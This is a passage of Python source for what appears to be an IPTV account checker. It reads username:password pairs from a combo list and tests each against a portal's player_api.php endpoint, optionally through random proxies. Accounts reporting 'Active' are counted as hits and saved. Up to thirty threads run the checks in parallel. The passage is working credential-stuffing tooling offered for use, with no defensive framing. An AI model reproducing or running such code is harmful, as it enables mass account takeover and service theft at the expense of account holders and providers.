			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 			 
def d30():
	global hit
	say=0
	proxy_=""
	for fyz in range(30,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_30'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(2)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)			 
			 			 			 			 
t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6= threading.Thread(target=d6)
t7= threading.Thread(target=d7)
t8= threading.Thread(target=d8)
t9= threading.Thread(target=d9)
t10= threading.Thread(target=d10)
t11= threading.Thread(target=d11)
t12= threading.Thread(target=d12)
t13= threading.Thread(target=d13)
t14= threading.Thread(target=d14)
t15= threading.Thread(target=d15)
t16 = threading.Thread(target=d16)
t17 = threading.Thread(target=d17)
t18 = threading.Thread(target=d18)
t19 = threading.Thread(target=d19)
t20 = threading.Thread(target=d20)
t21= threading.Thread(target=d21)
t22= threading.Thread(target=d22)
t23= threading.Thread(target=d23)
t24= threading.Thread(target=d24)
t25= threading.Thread(target=d25)
t26= threading.Thread(target=d26)
t27= threading.Thread(target=d27)
t28= threading.Thread(target=d28)
t29= threading.Thread(target=d29)
t30= threading.Thread(target=d30)



t1.start()

if botsay==2 or botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t2.start()

if botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t3.start()

if botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t4.start()

if botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t5.start()

if botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t6.start()

if botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t7.start()

if botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t8.start()

if botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t9.start()

if botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t10.start()

if botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t11.start()

if botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t12.start()

if botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t13.start()

if botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t14.start()

if botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t15.start()

if botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t16.start()

if botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t17.start()

if botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t18.start()

if botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t19.start()

if botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t20.start()

if botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t21.start()

if botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t22.start()

if botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t23.start()

if botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t24.start()

if botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t25.start()

if botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t26.start()

if botsay==27 or botsay==28 or botsay==29 or botsay==30:
	t27.start()

if botsay==28 or botsay==29 or botsay==30:
	t28.start()

if botsay==29 or botsay==30:
	t29.start()

if botsay==30:
	t30.start()